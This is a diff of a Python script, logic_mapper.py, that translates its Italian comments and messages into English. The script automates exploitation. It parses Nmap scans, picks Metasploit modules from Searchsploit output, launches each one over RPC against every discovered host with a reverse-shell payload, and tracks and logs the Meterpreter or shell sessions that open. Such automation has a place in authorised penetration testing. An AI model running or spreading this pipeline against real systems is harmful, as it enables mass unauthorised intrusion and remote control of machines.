@@ -2,14 +2,14 @@
 """
 logic_mapper.py
 ────────────────────────────────────────────────────────────────
-Cuore dell'automazione:
-  1. Parsa l'XML di Nmap → estrae servizi e versioni
-  2. Legge l'output JSON di Searchsploit → filtra exploit MSF
-  3. Si connette a Metasploit via RPC (pymetasploit3)
-  4. Carica i moduli e imposta RHOST automaticamente
-  5. Salva tutto su SQLite
+Core automation logic:
+  1. Parses Nmap XML → extracts services and versions
+  2. Reads Searchsploit JSON output → filters MSF exploits
+  3. Connects to Metasploit via RPC (pymetasploit3)
+  4. Loads modules and sets RHOST automatically
+  5. Saves everything to SQLite
 ────────────────────────────────────────────────────────────────
-Dipendenze:
+Dependencies:
   pip install pymetasploit3
 """
 
@@ -25,17 +25,17 @@ from datetime import datetime
 from pathlib import Path
 from typing import Optional
 
-# ── pymetasploit3 (import opzionale: gestito se mancante) ────
+# ── pymetasploit3 (optional import: handled if missing) ────
 try:
     from pymetasploit3.msfrpc import MsfRpcClient
     MSF_AVAILABLE = True
 except ImportError:
-    print("[WARN] pymetasploit3 non trovata. Funzionalità MSF disabilitate.")
+    print("[WARN] pymetasploit3 not found. MSF functionality disabled.")
     MSF_AVAILABLE = False
 
 # ─────────────────────────────────────────────────────────────
-# Configurazione — letta da config.ini (mai committato su Git)
-# Fallback sui valori di default se il file non esiste.
+# Configuration — read from config.ini (never committed to Git)
+# Fallback to default values if file does not exist.
 # ─────────────────────────────────────────────────────────────
 def _load_config(path: str = "config.ini") -> configparser.ConfigParser:
     cfg = configparser.ConfigParser()
@@ -50,7 +50,7 @@ def _load_config(path: str = "config.ini") -> configparser.ConfigParser:
     if Path(path).exists():
         cfg.read(path)
     else:
-        print(f"[CONFIG] {path} non trovato, uso valori di default.")
+        print(f"[CONFIG] {path} not found, using default values.")
     return cfg
 
 _CFG = _load_config()
@@ -64,14 +64,14 @@ POST_PIPELINE_WAIT  = _CFG["scanner"].getint("post_pipeline_wait")
 
 
 # ─────────────────────────────────────────────────────────────
-# Modulo 1 – Database
+# Module 1 – Database
 # ─────────────────────────────────────────────────────────────
 class Database:
     def __init__(self, db_path: str = DB_PATH):
         Path(db_path).parent.mkdir(parents=True, exist_ok=True)
         self.conn = sqlite3.connect(db_path)
         self._create_tables()
-        print(f"[DB] Connesso a: {db_path}")
+        print(f"[DB] Connected to: {db_path}")
 
     def _create_tables(self):
         cur = self.conn.cursor()
@@ -159,17 +159,17 @@ class Database:
 
 
 # ─────────────────────────────────────────────────────────────
-# Modulo 2 – Parser Nmap XML
+# Module 2 – Nmap XML Parser
 # ─────────────────────────────────────────────────────────────
 class NmapParser:
-    """Estrae host, porte, servizi e versioni dall'XML di Nmap."""
+    """Extracts hosts, ports, services and versions from Nmap XML."""
 
     def __init__(self, xml_path: str):
         self.xml_path = xml_path
 
     def parse(self) -> list[dict]:
         """
-        Restituisce lista di host:
+        Returns list of hosts:
           [{ ip, hostname, os, ports: [{port, protocol, service, version}] }]
         """
         hosts = []
@@ -177,11 +177,11 @@ class NmapParser:
             tree = ET.parse(self.xml_path)
             root = tree.getroot()
         except (ET.ParseError, FileNotFoundError) as e:
-            print(f"[PARSER] Errore lettura XML: {e}")
+            print(f"[PARSER] XML reading error: {e}")
             return hosts
 
         for host_el in root.findall("host"):
-            # Stato host
+            # Host status
             state_el = host_el.find("status")
             if state_el is None or state_el.get("state") != "up":
                 continue
@@ -205,7 +205,7 @@ class NmapParser:
             if os_el is not None:
                 os_info = os_el.get("name", "")
 
-            # Porte aperte
+            # Open ports
             ports = []
             for port_el in host_el.findall("ports/port"):
                 state = port_el.find("state")
@@ -239,17 +239,17 @@ class NmapParser:
                     "ports":    ports,
                 })
 
-        print(f"[PARSER] Host trovati: {len(hosts)}")
+        print(f"[PARSER] Hosts found: {len(hosts)}")
         return hosts
 
 
 # ─────────────────────────────────────────────────────────────
-# Modulo 3 – Filtro Searchsploit → MSF
+# Module 3 – Searchsploit → MSF Filter
 # ─────────────────────────────────────────────────────────────
 class SearchsploitFilter:
     """
-    Legge il JSON di searchsploit e torna solo gli exploit
-    che hanno un modulo Metasploit corrispondente.
+    Reads searchsploit JSON and returns only exploits
+    that have a corresponding Metasploit module.
     """
 
     def __init__(self, json_path: str):
@@ -261,25 +261,25 @@ class SearchsploitFilter:
             with open(self.json_path, "r") as f:
                 return json.load(f)
         except (FileNotFoundError, json.JSONDecodeError) as e:
-            print(f"[SSFILTER] Errore lettura JSON: {e}")
+            print(f"[SSFILTER] JSON reading error: {e}")
             return {}
 
     def get_msf_exploits(self) -> list[dict]:
         """
-        Filtra le voci il cui Path contiene 'metasploit'
-        o il cui titolo contiene 'MSF'.
-        Restituisce: [{ title, path, type, ip? }]
+        Filters entries whose Path contains 'metasploit'
+        or whose title contains 'MSF'.
+        Returns: [{ title, path, type, ip? }]
         """
         results = []
-        # searchsploit --nmap -j mette i risultati per IP
+        # searchsploit --nmap -j returns results by IP
         for ip, exploits in self._data.items():
             if not isinstance(exploits, list):
                 continue
             for ex in exploits:
                 path  = ex.get("Path", "")
                 title = ex.get("Title", "")
-                # Criterio principale: il percorso passa da /modules/ di MSF
-                # oppure il titolo indica "Metasploit"
+                # Main criterion: path goes through /modules/ of MSF
+                # or title indicates "Metasploit"
                 if "metasploit" in path.lower() or "msf" in title.lower():
                     results.append({
                         "ip":    ip,
@@ -287,11 +287,11 @@ class SearchsploitFilter:
                         "path":  path,
                         "type":  ex.get("Type", ""),
                     })
-        print(f"[SSFILTER] Exploit MSF-compatibili trovati: {len(results)}")
+        print(f"[SSFILTER] MSF-compatible exploits found: {len(results)}")
         return results
 
     def get_all_exploits(self) -> list[dict]:
-        """Tutti gli exploit, non solo quelli MSF."""
+        """All exploits, not just MSF ones."""
         results = []
         for ip, exploits in self._data.items():
             if not isinstance(exploits, list):
@@ -307,27 +307,27 @@ class SearchsploitFilter:
 
 
 # ─────────────────────────────────────────────────────────────
-# Modulo 4 – Metasploit RPC Client
+# Module 4 – Metasploit RPC Client
 # ─────────────────────────────────────────────────────────────
 class MetasploitManager:
     """
-    Si connette a msfrpcd e automatizza:
-      - Caricamento modulo exploit
-      - Impostazione RHOST / RPORT
-      - Esecuzione e recupero sessioni
+    Connects to msfrpcd and automates:
+      - Loading exploit module
+      - Setting RHOST / RPORT
+      - Execution and session recovery
     """
 
     def __init__(self, password: str = MSF_PASSWORD,
                  host: str = MSF_HOST, port: int = MSF_PORT):
         self.client = None
         if not MSF_AVAILABLE:
-            print("[MSF] pymetasploit3 non disponibile, skip connessione.")
+            print("[MSF] pymetasploit3 not available, skipping connection.")
             return
         try:
             self.client = MsfRpcClient(password, server=host, port=port)
-            print(f"[MSF] Connesso a msfrpcd su {host}:{port}")
+            print(f"[MSF] Connected to msfrpcd at {host}:{port}")
         except Exception as e:
-            print(f"[MSF] Connessione fallita: {e}")
+            print(f"[MSF] Connection failed: {e}")
             self.client = None
 
     def is_connected(self) -> bool:
@@ -335,9 +335,9 @@ class MetasploitManager:
 
     def path_to_module(self, exploit_path: str) -> Optional[str]:
         """
-        Converte un percorso searchsploit nel nome modulo MSF.
-        Es: /usr/share/metasploit-framework/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb
-            → exploits/unix/ftp/vsftpd_234_backdoor
+        Converts a searchsploit path to MSF module name.
+        E.g. /usr/share/metasploit-framework/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb
+             → exploits/unix/ftp/vsftpd_234_backdoor
         """
         if "modules/" not in exploit_path:
             return None
@@ -347,12 +347,12 @@ class MetasploitManager:
     def run_exploit(self, module_path: str,
                     rhost: str, rport: int = 0) -> dict:
         """
-        Tenta di eseguire un exploit e restituisce
+        Attempts to execute an exploit and returns
         { success, session_id, error }.
         """
         if not self.is_connected():
             return {"success": False, "session_id": None,
-                    "error": "Client non connesso"}
+                    "error": "Client not connected"}
 
         try:
             exploit = self.client.modules.use("exploit", module_path)
@@ -360,15 +360,15 @@ class MetasploitManager:
             if rport:
                 exploit["RPORT"] = rport
 
-            # Payload generico (meterpreter o shell)
+            # Generic payload (meterpreter or shell)
             payload = self.client.modules.use("payload",
                         "generic/shell_reverse_tcp")
-            print(f"[MSF] Lancio: {module_path} → {rhost}:{rport}")
+            print(f"[MSF] Launching: {module_path} → {rhost}:{rport}")
 
             job_id = exploit.execute(payload=payload)
-            print(f"[MSF] Job avviato: {job_id}")
+            print(f"[MSF] Job started: {job_id}")
 
-            # Aspetta brevemente e controlla le sessioni
+            # Wait briefly and check sessions
             time.sleep(5)
             sessions = self.client.sessions.list
             new_sessions = {sid: s for sid, s in sessions.items()
@@ -377,38 +377,38 @@ class MetasploitManager:
 
             if new_sessions:
                 sid = list(new_sessions.keys())[0]
-                print(f"[MSF] ✓ Sessione aperta: {sid}")
+                print(f"[MSF] ✓ Session opened: {sid}")
                 return {"success": True, "session_id": int(sid), "error": None}
             else:
-                print(f"[MSF] ✗ Nessuna sessione aperta.")
+                print(f"[MSF] ✗ No session opened.")
                 return {"success": False, "session_id": None, "error": None}
 
         except Exception as e:
-            print(f"[MSF] Errore esecuzione: {e}")
+            print(f"[MSF] Execution error: {e}")
             return {"success": False, "session_id": None, "error": str(e)}
 
 
 # ─────────────────────────────────────────────────────────────
-# Modulo 5 – Monitor Sessioni Meterpreter
+# Module 5 – Meterpreter Session Monitor
 # ─────────────────────────────────────────────────────────────
 class MeterpreterMonitor:
     """
-    Thread in background che fa polling su msfrpcd ogni N secondi.
-    Quando rileva una sessione Meterpreter nuova (o qualsiasi
-    sessione interattiva), stampa un avviso visibile con banner
-    colorato e salva l'evento nel database.
+    Background thread that polls msfrpcd every N seconds.
+    When it detects a new Meterpreter session (or any
+    interactive session), prints a visible alert with colored
+    banner and saves the event to the database.
 
-    Funzionamento:
-      - Mantiene un set degli ID sessione già notificati.
-      - Ogni `interval` secondi confronta la lista corrente
-        con lo snapshot precedente.
-      - Le nuove sessioni vengono classificate:
+    Operation:
+      - Maintains a set of already notified session IDs.
+      - Every `interval` seconds compares the current list
+        with the previous snapshot.
+      - New sessions are classified:
           • 'meterpreter'  → banner ★ METERPRETER
           • 'shell'        → banner ✓ SHELL
-          • altro          → banner ~ SESSIONE
+          • other          → banner ~ SESSION
     """
 
-    # Codici ANSI per la stampa colorata
+    # ANSI codes for colored output
     _RED    = "\033[91m"
     _GREEN  = "\033[92m"
     _YELLOW = "\033[93m"
@@ -419,9 +419,9 @@ class MeterpreterMonitor:
     def __init__(self, msf_client, db: "Database",
                  interval: int = 5):
         """
-        msf_client : istanza MsfRpcClient già autenticata
-        db         : istanza Database condivisa
-        interval   : secondi tra un polling e l'altro
+        msf_client : already authenticated MsfRpcClient instance
+        db         : shared Database instance
+        interval   : seconds between polls
         """
         self.client       = msf_client
         self.db           = db
@@ -434,10 +434,10 @@ class MeterpreterMonitor:
             daemon=True          # termina con il processo principale
         )
 
-    # ── Avvio / stop ────────────────────────────────────────
+    # ── Start / stop ────────────────────────────────────────
     def start(self):
-        """Avvia il thread di monitoraggio."""
-        # Snapshot iniziale: non notificare sessioni già aperte
+        """Starts the monitoring thread."""
+        # Initial snapshot: do not notify already open sessions
         try:
             self._known_sids = set(
                 str(k) for k in self.client.sessions.list.keys()
@@ -446,23 +446,23 @@ class MeterpreterMonitor:
             self._known_sids = set()
 
         self._thread.start()
-        print(f"{self._CYAN}[MONITOR] Avviato. "
-              f"Polling ogni {self.interval}s.{self._RESET}")
+        print(f"{self._CYAN}[MONITOR] Started. "
+              f"Polling every {self.interval}s.{self._RESET}")
 
     def stop(self):
-        """Ferma il thread pulitamente."""
+        """Stops the thread cleanly."""
         self._stop_event.set()
         self._thread.join(timeout=self.interval + 2)
-        print(f"{self._CYAN}[MONITOR] Arrestato.{self._RESET}")
+        print(f"{self._CYAN}[MONITOR] Stopped.{self._RESET}")
 
-    # ── Loop principale ──────────────────────────────────────
+    # ── Main loop ──────────────────────────────────────
     def _poll_loop(self):
         while not self._stop_event.is_set():
             try:
                 self._check_sessions()
             except Exception as e:
-                # Non crashare mai: il polling deve essere resiliente
-                print(f"[MONITOR] Errore polling: {e}")
+                # Never crash: polling must be resilient
+                print(f"[MONITOR] Polling error: {e}")
             self._stop_event.wait(self.interval)
 
     def _check_sessions(self):
@@ -477,7 +477,7 @@ class MeterpreterMonitor:
 
         self._known_sids = current_sids
 
-    # ── Notifica a schermo ───────────────────────────────────
+    # ── Screen notification ───────────────────────────────────
     def _notify(self, sid: str, info: dict):
         stype      = info.get("type", "unknown").lower()      # meterpreter / shell
         rhost      = info.get("target_host", "?")
@@ -487,7 +487,7 @@ class MeterpreterMonitor:
         arch       = info.get("arch", "?")
         opened_at  = datetime.now().strftime("%H:%M:%S")
 
-        # Scegli stile in base al tipo di sessione
+        # Choose style based on session type
         if "meterpreter" in stype:
             icon   = "★"
             label  = "METERPRETER SESSION"
@@ -498,7 +498,7 @@ class MeterpreterMonitor:
             color  = self._YELLOW
         else:
             icon   = "~"
-            label  = "NUOVA SESSIONE"
+            label  = "NEW SESSION"
             color  = self._CYAN
 
         banner = (
@@ -508,23 +508,23 @@ class MeterpreterMonitor:
             f"╠══════════════════════════════════════════════╣\n"
             f"║  Session ID : {sid:<31}║\n"
             f"║  Target     : {rhost:<31}║\n"
-            f"║  Tipo       : {stype:<31}║\n"
-            f"║  Piattaforma: {platform} / {arch:<26}║\n"
-            f"║  Utente     : {username:<31}║\n"
-            f"║  Modulo     : {via_module[:31]:<31}║\n"
-            f"║  Ora        : {opened_at:<31}║\n"
+            f"║  Type       : {stype:<31}║\n"
+            f"║  Platform   : {platform} / {arch:<26}║\n"
+            f"║  User       : {username:<31}║\n"
+            f"║  Module     : {via_module[:31]:<31}║\n"
+            f"║  Time       : {opened_at:<31}║\n"
             f"╚══════════════════════════════════════════════╝"
             f"{self._RESET}\n"
         )
         # Stampa in modo thread-safe (print è GIL-protected)
         print(banner, flush=True)
 
-    # ── Persistenza DB ───────────────────────────────────────
+    # ── DB persistence ───────────────────────────────────────
     def _persist(self, sid: str, info: dict):
         """
-        Aggiorna Exploits_Found: se esiste una riga con session_id=None
-        per questo rhost, la aggiorna; altrimenti inserisce una nuova riga
-        di tipo 'monitor' per tracciarla comunque.
+        Updates Exploits_Found: if a row exists with session_id=None
+        for this rhost, updates it; otherwise inserts a new row
+        of type 'monitor' to track it anyway.
         """
         rhost      = info.get("target_host", "")
         via_module = info.get("via_exploit", "")
@@ -533,7 +533,7 @@ class MeterpreterMonitor:
         try:
             cur = self.db.conn.cursor()
 
-            # Cerca una riga exploit già esistente senza sessione per questo host
+            # Look for an existing exploit row without session for this host
             cur.execute(
                 "SELECT id FROM Exploits_Found "
                 "WHERE rhost=? AND session_id IS NULL "
@@ -550,8 +550,8 @@ class MeterpreterMonitor:
                     (int(sid), datetime.now().isoformat(), row[0])
                 )
             else:
-                # Sessione rilevata dal monitor ma non avviata da noi:
-                # la registriamo comunque come evento di audit.
+                # Session detected by monitor but not started by us:
+                # register it anyway as an audit event.
                 cur.execute(
                     "INSERT INTO Exploits_Found "
                     "(vuln_id, msf_module, rhost, rport, session_id, "
@@ -563,11 +563,11 @@ class MeterpreterMonitor:
 
             self.db.conn.commit()
         except Exception as e:
-            print(f"[MONITOR] Errore DB: {e}")
+            print(f"[MONITOR] DB error: {e}")
 
 
 # ─────────────────────────────────────────────────────────────
-# Orchestratore principale
+# Main orchestrator
 # ─────────────────────────────────────────────────────────────
 class LogicMapper:
     def __init__(self, xml_path: str, json_path: str,
@@ -581,36 +581,36 @@ class LogicMapper:
 
     def run(self):
         print("\n" + "="*55)
-        print("  LOGIC MAPPER – Avvio pipeline")
+        print("  LOGIC MAPPER – Starting pipeline")
         print("="*55 + "\n")
 
-        # ── Avvia monitor sessioni (se MSF disponibile) ───────
+        # ── Start session monitor (if MSF available) ───────
         if self.msf.is_connected():
             self.monitor = MeterpreterMonitor(
                 self.msf.client, self.db, self._monitor_interval
             )
             self.monitor.start()
 
-        # ── Step 1: Parsa Nmap XML ────────────────────
+        # ── Step 1: Parse Nmap XML ────────────────────
         parser = NmapParser(self.xml_path)
         hosts  = parser.parse()
 
         if not hosts:
-            print("[MAPPER] Nessun host rilevato. Terminazione.")
+            print("[MAPPER] No hosts detected. Terminating.")
             self.db.close()
             return
 
-        # ── Step 2: Filtra exploit MSF da searchsploit ─
+        # ── Step 2: Filter MSF exploits from searchsploit ─
         ss_filter   = SearchsploitFilter(self.json_path)
         msf_exploits = ss_filter.get_msf_exploits()
         all_exploits = ss_filter.get_all_exploits()
 
-        # Dizionario veloce ip → exploits
+        # Fast dictionary ip → exploits
         exploits_by_ip: dict[str, list] = {}
         for ex in all_exploits:
             exploits_by_ip.setdefault(ex["ip"], []).append(ex)
 
-        # ── Step 3: Per ogni host, persiste e tenta exploit ─
+        # ── Step 3: For each host, persist and attempt exploits ─
         for host in hosts:
             ip       = host["ip"]
             hostname = host["hostname"]
@@ -618,7 +618,7 @@ class LogicMapper:
 
             target_id = self.db.insert_target(ip, hostname, os_info)
             print(f"\n[MAPPER] Host: {ip} ({hostname or 'n/a'}) "
-                  f"OS: {os_info or 'sconosciuto'}")
+                  f"OS: {os_info or 'unknown'}")
 
             host_exploits = exploits_by_ip.get(ip, [])
 
@@ -628,10 +628,10 @@ class LogicMapper:
                 service  = port_info["service"]
                 version  = port_info["version"]
 
-                print(f"  ↳ Porta {port}/{protocol}: "
+                print(f"  ↳ Port {port}/{protocol}: "
                       f"{service} {version}")
 
-                # Cerca exploit per questo host/porta
+                # Look for exploits for this host/port
                 for ex in host_exploits:
                     has_msf = "metasploit" in ex["path"].lower()
                     vuln_id = self.db.insert_vulnerability(
@@ -643,7 +643,7 @@ class LogicMapper:
                     if has_msf and self.msf.is_connected():
                         mod = self.msf.path_to_module(ex["path"])
                         if mod:
-                            print(f"    → Tentativo MSF: {mod}")
+                            print(f"    → MSF attempt: {mod}")
                             result = self.msf.run_exploit(mod, ip, port)
                             self.db.insert_exploit_attempt(
                                 vuln_id, mod, ip, port,
@@ -651,11 +651,11 @@ class LogicMapper:
                                 result["success"]
                             )
 
-        print("\n[MAPPER] Pipeline completata. Dati salvati nel DB.")
+        print("\n[MAPPER] Pipeline completed. Data saved to DB.")
 
         # ── Stop monitor ──────────────────────────────────────
         if self.monitor:
-            print(f"[MAPPER] Attendo {POST_PIPELINE_WAIT}s per sessioni ritardate...\n")
+            print(f"[MAPPER] Waiting {POST_PIPELINE_WAIT}s for delayed sessions...\n")
             time.sleep(POST_PIPELINE_WAIT)
             self.monitor.stop()
 
@@ -669,11 +669,11 @@ def main():
     ap = argparse.ArgumentParser(
         description="Logic Mapper – Nmap + Searchsploit + Metasploit"
     )
-    ap.add_argument("--xml",  required=True, help="Percorso XML Nmap")
-    ap.add_argument("--json", required=True, help="Percorso JSON Searchsploit")
+    ap.add_argument("--xml",  required=True, help="Path to Nmap XML")
+    ap.add_argument("--json", required=True, help="Path to Searchsploit JSON")
     ap.add_argument("--monitor-interval", type=int, default=5,
                     metavar="SEC",
-                    help="Secondi tra un polling del monitor e l'altro (default: 5)")
+                    help="Seconds between monitor polls (default: 5)")
     args = ap.parse_args()
 
     mapper = LogicMapper(args.xml, args.json, args.monitor_interval)
